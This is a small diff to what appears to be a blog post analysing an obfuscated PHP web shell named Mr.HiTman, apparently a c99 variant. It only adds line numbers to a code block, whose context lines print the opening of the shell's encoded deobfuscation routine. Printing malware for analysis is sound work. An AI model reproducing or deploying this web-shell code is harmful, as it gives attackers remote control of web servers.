@@ -17,7 +17,7 @@ Mr.HiTman&#8217;s shell is an encrypted PHP script &#8211; probably c99 or a var
 
 ### Mr.HiTman Shell Script (encrypted) Source Code
 
-{% highlight php %}<?php /* Mr.HiTman */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63
+{% highlight php linenos %}<?php /* Mr.HiTman */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63
 %6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO0000
 00{5};$OOO0000O0.=$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16};$O
 OO0000O0.=$OOO0000O0{3}.$OOO000000{11}.$OOO000000{12}.$OOO0000O0{7}.$OOO000000{
